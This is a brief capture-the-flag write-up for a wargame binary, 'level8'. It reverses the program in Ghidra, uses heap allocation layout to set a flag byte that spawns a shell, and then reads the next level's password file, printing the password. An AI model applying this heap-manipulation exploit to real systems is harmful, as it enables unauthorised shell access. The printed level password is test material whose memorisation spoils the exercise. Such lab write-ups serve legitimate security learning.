# level8

Run level8 exec and check in ghidra.
We see this is composed of just 1 long main function, it has an infinite loop that asks for user input. 
The program prints "nil" twice and waits for stdin.

In the end it will check if auth[8] == 0 if it isn't we will have access to /bin/sh.
auth is undefined4 type so auth[8] is auth + 32 bytes

> Ghidra uses placeholder values for variable since it does not know real type. These placeholder type size can be inconsistent, so a uint8_t or uint16_t on ghidra might be a different size.

Input "auth \n" to malloc(4) auth var
input "service0123456789abcdef\n" to stdup input+7

We see that auth var is at 0x804a008and service var at 0x804a018 (16 bytes padding)
so auth+32 == "\n" (end of service)

> we can input "login" and get the flag

    $ ./level8 
    (nil), (nil) 
    auth 
    0x804a008, (nil) 
    service0123456789abcdef
    0x804a008, 0x804a018 
    login
    $ cat /home/user/level9/.pass
    c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a